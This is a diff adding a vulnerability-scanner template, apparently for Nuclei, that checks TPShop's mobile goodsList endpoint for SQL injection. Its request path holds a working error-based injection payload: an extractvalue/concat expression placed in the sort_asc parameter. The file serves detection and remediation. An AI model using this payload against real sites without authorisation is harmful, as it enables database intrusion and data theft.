@@ -1,0 +1,25 @@
+id: tpshop-goodslist-id-sqli
+
+info:
+  name: TPShop goodsList id SQL Injection
+  author: bl
+  severity: high
+  description: |
+    A SQL injection vulnerability exists in the TPShop frontend goodsList endpoint. The order/sort parameter is improperly sanitized, allowing an attacker to inject SQL expressions that are executed by the backend database.
+  impact: |
+    Successful exploitation allows attackers to execute arbitrary SQL queries, leading to sensitive data disclosure, authentication bypass, and potential full database compromise depending on database privileges.
+  remediation: |
+    Use parameterized queries and strict input validation for all sorting and ordering parameters. Avoid directly concatenating user input into SQL statements.
+  tags: TPSHOP
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/Mobile/Goods/goodsList/id/1/sort_asc/desc,extractvalue(1,concat(0x7e,(select%20md5(1)),0x7e))"
+
+    matchers:
+      - type: word
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849"
+        part: body
+        condition: and
